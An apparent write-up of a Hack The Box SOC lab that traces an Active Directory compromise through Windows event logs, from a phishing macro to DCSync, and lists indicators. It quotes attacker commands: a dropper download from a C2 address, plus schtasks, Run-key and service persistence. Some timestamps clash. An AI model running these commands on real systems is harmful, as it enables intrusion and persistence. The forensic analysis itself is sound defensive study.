---
title: "HTB-GhostTrace"
date: 2026-01-31
draft: false
tags:
  - SOC
  - Log Analysis
  - Windows
  - Active Directory
  - Event Viewer
  - Mimikatz
  - PowerView
platform: SOC
---

{{< infobox difficulty="Easy" os="Windows" date="2026-01-31" >}}

**Description:**  
Investigation of an Active Directory breach in Main.local domain involving DC01 and two clients (Client02, Client03). User on Client02 received a phishing email that led to full domain compromise.

### TL;DR
Analyzed Windows Event Logs revealing a complete AD compromise chain: phishing email with macro-enabled document → credential dumping with Mimikatz → lateral movement via PsExec → DCSync attack → domain admin compromise → persistence via scheduled task, service, and registry run key.

### <span style="color:red">Attack Timeline</span>
```
2025-05-25 03:27:56 UTC - Initial compromise (Client02)
2025-05-25 03:32:02 UTC - Dropper download
2025-05-25 04:28:17 UTC - Reverse shell established
2025-05-25 03:37:00 UTC - PowerView downloaded
2025-05-25 03:42:33 UTC - Kerberoasting (sqlsvc)
2025-05-25 04:03:47 UTC - Lateral movement to Client03
2025-05-25 04:10:43 UTC - Mimikatz execution
2025-05-25 04:12:21 UTC - Credential abuse (lucas)
2025-05-25 04:26:36 UTC - DCSync attack
2025-05-25 04:34:01 UTC - Domain Admin access
2025-05-25 04:38:53 UTC - Persistence established
```

### <span style="color:red">Initial Access</span>
T1566.001  
At `2025-05-25 03:27:56 UTC`, user `MAIN\jody` opened a malicious macro-enabled document:
```
Process: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
File: C:\Users\jody\Downloads\Profits.docm
Parent: C:\Windows\explorer.exe (PID 2092)
PID: 1160

SHA256: 1C254F5E03462A7C232265E913162DF2AAE6B5EA5056284512BB32343C0A9507
```

### <span style="color:red">Execution</span>
The macro spawned a command shell, which launched PowerShell (PID 4776):
```
Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Parent: C:\Windows\System32\cmd.exe (PID 8996)
Working Directory: C:\Users\jody\Documents\
User: MAIN\jody
```

T1105  
At `2025-05-25 03:32:02 UTC`, the attacker downloaded a dropper:
```powershell
Invoke-WebRequest -Uri "http://192.168.204.152/UpdatePolicy.exe" -OutFile "C:\Users\jody\Downloads\UpdatePolicy.exe"
```

**C2 Server:** `192.168.204.152`
T1071.001  
At `2025-05-25 04:28:17 UTC`, reverse shell established:
```
Process: C:\Users\jody\Downloads\UpdatePolicy.exe (PID 4352)
Source: 192.168.204.129:49956
Destination: 192.168.204.152:1337
```

### <span style="color:red">Discovery</span>
T1087.002  
At `2025-05-25 03:37:00 UTC`, PowerView downloaded for AD enumeration:
```
ScriptBlock ID: 232ebf81-40d1-402f-8910-9ee157bc7dca
Path: C:\Users\jody\Downloads\PowerView.ps1
```

### <span style="color:red">Credential Access</span>
T1558.003  
At `2025-05-25 03:42:33 UTC`, Kerberos TGS requested for service account:
```
Account: jody@MAIN.LOCAL
Service: sqlsvc (S-1-5-21-620716483-2719109048-3577772375-2115)
Ticket Encryption: 0x17 (RC4-HMAC)
Ticket Options: 0x40810000
```

The attacker successfully cracked the service account credentials offline.
T1003.001  
At `2025-05-25 04:10:43 UTC`, Mimikatz executed on Client02 (masqueraded as netdiag.exe):
```
Process: C:\Users\jody\Downloads\netdiag.exe
Parent: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe (PID 6304)
User: NT AUTHORITY\SYSTEM
Time: 2025-05-25 04:10:43 UTC
```

**Credentials obtained:** `MAIN\lucas` (cleartext password)

### <span style="color:red">Lateral Movement</span>
T1021.002  
At `2025-05-25 04:03:47 UTC`, lateral movement to Client03 via renamed PsExec:
```
Process: C:\Windows\VgYTbFEK.exe
User: NT AUTHORITY\SYSTEM
Time: 2025-05-25 04:05:12 UTC
```

Post-exploitation commands executed at `04:07:57 UTC`:
```cmd
whoami          # Verify SYSTEM privileges
net user        # Enumerate local accounts (04:08:23 UTC)
```

T1078.002   
At `2025-05-25 04:12:21 UTC`, attacker used stolen credentials:
```cmd
runas /user:Main\lucas cmd
```
```
Account: sqlsvc
Authentication Package: MICROSOFT_AUTHENTICATION_PACKAGE_V1_0
Logon Time: 2025-05-25 04:03:47 UTC
Error Code: 0x0 (Success)
```

### <span style="color:red">Privilege Escalation</span>
T1003.006  
At `2025-05-25 04:26:36 UTC`, DCSync attack executed against DC01:

```
Subject: MAIN\lucas (S-1-5-21-620716483-2719109048-3577772375-2114)
Object Server: DS
Access List: DS-Replication-Get-Changes-All
Property GUID: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}
```

This GUID corresponds to the `DS-Replication-Get-Changes-All` extended right, allowing replication of KRBTGT hash and all domain credentials.

**Domain Admin Access:** `2025-05-25 04:34:01 UTC`

### <span style="color:red">Persistence</span>
T1053.005  
At `2025-05-25 04:38:53 UTC`:
```
Process: C:\Windows\System32\schtasks.exe
CommandLine: schtasks.exe /create /tn WindowsUpdateCheck /tr C:\Windows\System32\scvhost.exe /sc onstart /ru SYSTEM /f
User: MAIN\Administrator
Parent: C:\Windows\System32\wsmprovhost.exe (WinRM)
```

T1547.001  
At `2025-05-25 04:40:09 UTC`:
```
Process: C:\Windows\System32\reg.exe
CommandLine: reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v xcvafctr /t REG_SZ /d C:\Windows\System32\scvhost.exe /f
User: MAIN\Administrator
Parent: C:\Windows\System32\wsmprovhost.exe (WinRM)
```

T1543.003  
At `2025-05-25 04:43:01 UTC`:

```
Process: C:\Windows\System32\sc.exe
CommandLine: sc.exe create WindowsUpdateSvc binPath= C:\Windows\System32\scvhost.exe start= auto
User: MAIN\Administrator
Parent: C:\Windows\System32\wsmprovhost.exe (WinRM)
```

**Persistence Payload:** `C:\Windows\System32\scvhost.exe` (typosquatting svchost.exe)

### <span style="color:red">Indicators of Compromise</span>

**Files:**
- `C:\Users\jody\Downloads\Profits.docm` (SHA256: `1C254F5E03462A7C232265E913162DF2AAE6B5EA5056284512BB32343C0A9507`)
- `C:\Users\jody\Downloads\UpdatePolicy.exe`
- `C:\Users\jody\Downloads\PowerView.ps1`
- `C:\Users\jody\Downloads\netdiag.exe` (Mimikatz)
- `C:\Windows\VgYTbFEK.exe` (PsExec)
- `C:\Windows\System32\scvhost.exe` (Persistence backdoor)

**Network:**
- C2 Server: `192.168.204.152:1337`
- Victim: `192.168.204.129`

**Compromised Accounts:**
- `MAIN\jody` (initial victim)
- `MAIN\sqlsvc` (service account - Kerberoasted)
- `MAIN\lucas` (domain user)
- `MAIN\Administrator` (domain admin)

**Scheduled Task:** `WindowsUpdateCheck`  
**Service:** `WindowsUpdateSvc`  
**Registry Run Key:** `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\xcvafctr`